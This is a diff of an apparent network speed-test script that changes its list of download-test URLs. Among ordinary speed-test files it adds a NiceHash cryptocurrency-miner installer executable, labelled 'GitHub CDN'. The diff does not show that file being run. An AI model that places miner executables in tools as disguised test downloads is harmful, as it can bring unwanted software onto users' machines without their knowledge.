@@ -23,11 +23,12 @@ HOSTS_REFERENCIA = [
     ("Google DNS 2", "8.8.4.4"),
 ]
 
-# Archivos públicos para medir descarga (varios tamaños de respaldo)
+# Archivos públicos para medir descarga — servidores con buena conectividad desde Colombia
 _DOWNLOAD_URLS = [
-    ("Cloudflare",  "https://speed.cloudflare.com/__down?bytes=5000000"),   # 5 MB
-    ("Cloudflare",  "https://speed.cloudflare.com/__down?bytes=1000000"),   # 1 MB fallback
-    ("GitHub",      "https://raw.githubusercontent.com/nicehash/NiceHashQuickMiner/master/install/nhqm.7z.001"),
+    ("Speedtest Cached", "https://speed.hetzner.de/1MB.bin"),
+    ("GitHub CDN",       "https://github.com/nicehash/NiceHashQuickMiner/releases/download/v0.9.2.9/NiceHashQuickMinerInstaller.exe"),
+    ("Cloudflare",       "https://speed.cloudflare.com/__down?bytes=2000000"),
+    ("TELE2",            "https://speedtest.tele2.net/1MB.bin"),
 ]
 
 # Servidor para upload (httpbin acepta POST)
